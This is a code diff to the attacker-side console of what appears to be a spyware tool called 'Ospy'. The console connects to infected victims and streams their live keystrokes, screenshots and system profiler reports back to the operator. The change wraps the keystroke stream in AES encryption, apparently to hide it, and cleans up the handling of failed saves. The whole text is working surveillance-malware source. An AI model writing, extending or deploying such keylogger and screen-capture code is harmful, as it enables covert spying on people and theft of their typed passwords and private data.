@@ -34,8 +34,10 @@ main_data data;
 void stop_keystrokes_stream_loop ();
 void stop_screen_stream_sig();
 
+//tish is a test
+
 int main (){
-	char key_press[LICENSE_KEY_LENGTH];
+	char encrypted_keystroke[ENCRYPTED_TEXT_LEN(LICENSE_KEY_LENGTH)];
 	
 	while (create_connection() != CONNECTION_SUCCESS){
 		printf("[\033[31;1m-\033[0m] \033[31;1mconnection failed, trying to connect again ...\033[0m\n");
@@ -96,25 +98,22 @@ int main (){
 				else {	
 					printf("\r[\033[31;1m-\033[0m] \033[31;1m%s's keylogger log failed to save \033[0m\n", selected_victim_name);
 					sleep(2);
-				}
-			
+				}			
 				break;
-				
 			case '2':
 				signal(SIGINT, stop_keystrokes_stream_loop);
 				A_2_S_encrypted_message_handler(data, GET_KEYSTROKES_STREAM);
 				printf("\n[\033[33;1m!\033[0m] ctrl+c to stop getting victim's live keystrokes\n");
 				printf("[\033[32;1m+\033[0m]\033[1m\033[32m %s's live key keystrokes :\033[0m\n",selected_victim_name);
 				while (keep_getting_keystrokes){
-					recv(attacker_socket, &key_press, MAX_KEYSTROKE_LEN, 0);
-					printf("%s",key_press);
-					bzero(key_press, MAX_KEYSTROKE_LEN);
+					recv(attacker_socket, &encrypted_keystroke, ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN), 0);
+					printf("%s", decrypt_text(encrypted_keystroke, AES_KEY));
+					bzero(encrypted_keystroke, ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN));
 					fflush(stdout);	
 				}
 				keep_getting_keystrokes = true; // set the keep_getting_keystrokes flag to the next time
 				
 				break;
-				
 			case '3':
 				signal(SIGINT, stop_screen_stream_sig);
 				A_2_S_encrypted_message_handler(data, GET_SCREEN_STREAM);
@@ -122,21 +121,22 @@ int main (){
 				printf("\r[»] Ospy folder path : ");
 				fflush(stdout);
 				system("pwd");
-				while (keepRunningscreen){
+				while (keepRunningscreen){ // it the attacker will press ^C, SIGINT signal will sand to 'stop_screen_stream_sig'
 					recv_file(selected_victim_name, "screenshot", ".jpg", "screenshots");
 				}	
-				
+				keepRunningscreen = 1; // in case the attacker will use this option again  
 				break;
 				
 			case '4':
 				A_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
 				printf("[\e[93m◷\033[0m]\e[93m This action may take about 3 minutes, please wait !\033[0m");
 				fflush(stdout);
-				if (recv_file(selected_victim_name, "system_profiler", ".txt", "system_profilers") == FILE_RECEIVED){
-					printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m %s's system profiler saved successfully\n\033[0m", selected_victim_name);
-					press_enter_to_continue();
-				}
+				if (recv_file(selected_victim_name, "system_profiler", ".txt", "system_profilers") == FILE_RECEIVED)
+					printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m %s's system profiler saved successfully\n\033[0m", selected_victim_name);	
+				else 
+					printf("\r[\033[31;1m-\033[0m] \033[31;1m system profiler has unabal to saved successfully\n\033[0m");
 				
+				press_enter_to_continue();
 				break;
 	
 			case '5':
